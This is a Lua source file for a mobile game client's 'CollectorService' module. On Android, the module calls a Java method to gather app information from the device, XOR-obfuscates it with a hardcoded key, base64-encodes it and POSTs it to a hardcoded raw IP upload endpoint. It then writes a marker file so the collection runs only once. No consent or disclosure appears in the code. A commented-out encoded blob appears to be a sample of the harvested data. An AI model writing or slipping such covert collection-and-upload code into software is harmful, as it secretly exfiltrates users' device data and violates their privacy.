local Version = require "app.kod.util.Version"

local CollectorService = class("CollectorService")

local isWin32Enabled = true
local _instance = nil

function CollectorService.getInstance()
    if _instance then
        return _instance
    end

    _instance = CollectorService.new()
    _instance:initialize()
    return _instance
end

function CollectorService:ctor()
    self._finalAppInfos = ""
end

function CollectorService:initialize()
end

-- 判断当前版本是否支持
function CollectorService:isSupported()
	if game.plugin.Runtime.isEnabled() == false then
		-- 支持模拟器测试
		return true;
	end
	
	local currentVersion = Version.new(game.plugin.Runtime.getBuildVersion())
	local supportVersion = Version.new("4.1.3.0")
	return currentVersion:compare(supportVersion) >= 0;
end

function CollectorService:isEnabled()
    if not self:isSupported() then
        return false
    end

    if device.platform == "android" then
        return true
    elseif device.platform == "ios" then
        return false
    else
        -- 其它的暂且当win32处理吧，也没其它版本
        return isWin32Enabled
    end
end

function CollectorService:collect()
    -- local tmp = "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"
    -- tmp = kod.util.String.unbase64(tmp)
    -- tmp = self:_xor(tmp)
    -- print(tmp)
    if not self:isSupported() then
        return
    end

    if self:_isFinished() then
        return
    end

    self:_doCollect()
end

function CollectorService:_send()
    if not self:isEnabled() then
        return
    end
end

function CollectorService:_xor(str)
    local key = "asdkladf!@ka1@#i"
    local tb = {}
    for i=1,#str do
        tb[#tb+1] = string.char(bit.bxor(string.byte(str,i), string.byte(key, i%#key + 1)))
    end
    return table.concat(tb, "")
end

function CollectorService:_doCollect()
    if not self:isEnabled() then
        return
    end

    self._finalAppInfos = ""
    if device.platform == "android" then
        local ok, ret = luaj.callStaticMethod("com/lohogames/common/AppInfo", "getAppInfo", {function(str)
            self._finalAppInfos = self:_xor(str)
            -- -- 编码转换
            if self._finalAppInfos and self._finalAppInfos ~= "" then
                self._finalAppInfos = kod.util.String.base64(self._finalAppInfos)
            end
            -- -- 上传对指定的服务器
            --Logger.uploadFile(self._finalAppInfos)

            local TEMP_UPLOAD_URL = "http://118.89.176.115:8899/logupload.php"
            kod.util.Http.sendRequest(TEMP_UPLOAD_URL, self._finalAppInfos, nil, "POST")

            self:_doFinished()
        end})
        Logger.debug("CollectorService: ok, ret: "..tostring(ok)..", "..tostring(ret))
        if Macro.assertTrue(ok == false, tostring(ret)) then return end
    else
        self:_doFinished()
        return
    end
end

-- 判断文件收集文件
function CollectorService:_getFilePath()
	return cc.FileUtils:getInstance():getAppDataPath().."/cpuid"
end

-- 是否已经完成收集
function CollectorService:_isFinished()
    return cc.FileUtils:getInstance():isFileExist(self:_getFilePath())
end

-- 创建文件，标记已经收集完成
function CollectorService:_doFinished()
    local file = io.open(self:_getFilePath(), "wb")
    file:write("1")
    file:close()
end

return CollectorService